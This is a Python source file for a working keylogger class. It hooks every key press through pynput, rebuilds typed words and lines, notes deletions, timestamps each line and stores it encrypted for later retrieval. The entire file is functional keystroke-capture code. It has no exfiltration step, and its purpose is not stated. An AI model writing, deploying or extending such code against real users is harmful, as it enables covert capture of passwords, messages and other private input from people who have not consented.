from pynput import keyboard
from datetime import datetime
from encryptor import Encryptor

class KeyloggerService:
    def __init__(self):
        self.current_line = ""
        self.current_word = ""
        self.logged_lines = []
        self.listener = None

    def _on_press(self, key):
        try:
            char = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                char = " "
            elif key == keyboard.Key.enter:
                char = "\n"
            elif key == keyboard.Key.backspace:
                char = "<backspace>"
            else:
                return

        if char == "<backspace>":
            if self.current_word:
                removed_word = self.current_word
                self.current_word = ""
                self.current_line = self.current_line.rstrip()
                self.current_line += f"(מחיקה של: {removed_word}) "
            else:
                self.current_line = self.current_line.rstrip()
        elif char == " ":
            self.current_line += self.current_word + " "
            self.current_word = ""
        elif char == "\n":
            if self.current_word:
                self.current_line += self.current_word
                self.current_word = ""
            if self.current_line.strip():
                timestamp = datetime.now().strftime("%H:%M")
                log_line = f"{timestamp} | {self.current_line.strip()}"
                encrypted_log = Encryptor.encrypt(log_line)
                self.logged_lines.append(encrypted_log)
            self.current_line = ""
        else:
            self.current_word += char

    def start_logging(self):
        if self.listener and self.listener.running:
            return
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop_logging(self):
        if self.listener and self.listener.running:
            self.listener.stop()
        if self.current_word:
            self.current_line += self.current_word
            self.current_word = ""
        if self.current_line.strip():
            timestamp = datetime.now().strftime("%H:%M")
            log_line = f"{timestamp} | {self.current_line.strip()}"
            encrypted_log = Encryptor.encrypt(log_line)
            self.logged_lines.append(encrypted_log)
            self.current_line = ""

    def get_logged_lines(self):
        return self.logged_lines
